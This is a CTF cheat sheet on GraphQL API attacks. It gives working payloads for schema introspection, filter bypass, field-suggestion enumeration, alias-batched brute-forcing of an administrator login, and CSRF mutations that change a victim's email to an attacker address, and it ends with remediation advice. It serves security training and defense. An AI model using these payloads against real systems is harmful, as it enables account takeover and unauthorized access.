# GraphQL API Vulnerabilities — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, InQL extension, Clairvoyance  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

GraphQL is a query language for APIs that allows clients to request exactly the data they need.

1. **Locate GraphQL Endpoints:**
   - Standard paths: `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphql/v1`, `/query`, `/api`.
   - Test methods: `POST` with `Content-Type: application/json` or `application/graphql`, `GET /graphql?query={__typename}`.
2. **Probe Introspection:**
   - Submit full introspection query to retrieve the entire schema (all types, queries, mutations, fields).
3. **Bypass Introspection Filters:**
   - Newline injection, query naming, or character encoding if regex filters block `__schema`.
4. **Leverage Field Suggestions (Clairvoyance):**
   - If introspection is completely disabled, abuse typo suggestion errors (`"Did you mean ...?"`) to reconstruct the schema.
5. **Bypass Rate Limiting via Query Aliasing:**
   - Batch multiple queries or mutations inside a single HTTP request using aliases.
6. **Test CSRF over GraphQL:**
   - Check if the endpoint accepts `GET` requests or form-encoded POST requests (`application/x-www-form-urlencoded`).

---

## 2. Introspection & Schema Dumping

### 1. Universal Introspection Query (Copy & Paste)
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

---

### 2. Fast Minimal Introspection Probes

#### Probe Root Types:
```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

#### Probe Specific Type Fields:
```graphql
query {
  __type(name: "User") {
    name
    fields {
      name
      type { name }
    }
  }
}
```

---

## 3. Bypassing Introspection Defenses

### 1. Regex Filter Bypass (Bypassing `__schema` keyword match)
When a WAF or middleware regex inspects requests for `__schema`:

```graphql
# Newline injection:
query {
  __schema
  {types{name}}
}

# Named operation:
query GetSchema {
  __schema {
    types { name }
  }
}
```

---

### 2. Reconstructing Schema via Field Suggestions
If introspection is strictly disabled, GraphQL servers still provide helpful suggestions for typos:
```graphql
query {
  usre
}
```
*Response:*
```json
{"errors": [{"message": "Cannot query field 'usre' on type 'Query'. Did you mean 'user' or 'users'?"}]}
```
Use tools like **Clairvoyance** to automatically brute-force the wordlist against suggestions and recreate the schema.

---

## 4. Bypassing Rate Limits via Query Aliasing

GraphQL allows requesting multiple aliases for the same operation in a single HTTP request. This completely bypasses traditional IP-based HTTP rate-limit counters.

### Brute-Forcing Logins in One Request:
```graphql
mutation {
  auth1: login(input: {username: "administrator", password: "password1"}) {
    token
    success
  }
  auth2: login(input: {username: "administrator", password: "password2"}) {
    token
    success
  }
  auth3: login(input: {username: "administrator", password: "password3"}) {
    token
    success
  }
}
```
*Use **Burp Intruder** or a quick Python script to generate hundreds of alias lines inside one JSON payload.*

---

## 5. CSRF over GraphQL

If a mutation modifies application state (e.g. `changeEmail`, `deleteAccount`), verify if the endpoint parses alternative Content-Types:

### 1. Form-Encoded POST (`application/x-www-form-urlencoded`)
```http
POST /graphql HTTP/2
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded

query=mutation%20{%20changeEmail(input:{email:"hacker@evil.com"}){success}%20}
```

### 2. URL Query GET Requests
```http
GET /graphql?query=mutation{changeEmail(input:{email:"hacker@evil.com"}){success}} HTTP/2
```
*If accepted, deliver via standard CSRF HTML PoC.*

---

## 6. CTF Quick Reference

| Goal | Technique | Payload / Tool |
|---|---|---|
| **Dump Schema** | Full Introspection Query | Run in Burp InQL / Repeater |
| **Introspection Filter**| Newline / Named query | `query Bypass {\n__schema{...}}` |
| **Introspection Disabled**| Field suggestions | Fuzz typos to trigger "Did you mean?" |
| **Bypass Rate Limit** | Aliasing | `a1: login(...), a2: login(...)` |
| **CSRF Mutation** | Method / Type tampering | `POST` form-encoded or `GET /graphql?query=...` |

---

## 7. Remediation

- **Disable Introspection in Production:** Ensure `introspection: false` is configured in production deployment settings.
- **Disable Field Suggestions:** Suppress "Did you mean ...?" hints in error responses.
- **Enforce Query Depth & Complexity Limits:** Reject queries with excessive nested depths or alias quantities.
- **CSRF Defense:** Require strict `Content-Type: application/json` and validate anti-CSRF tokens for all state-changing mutations.
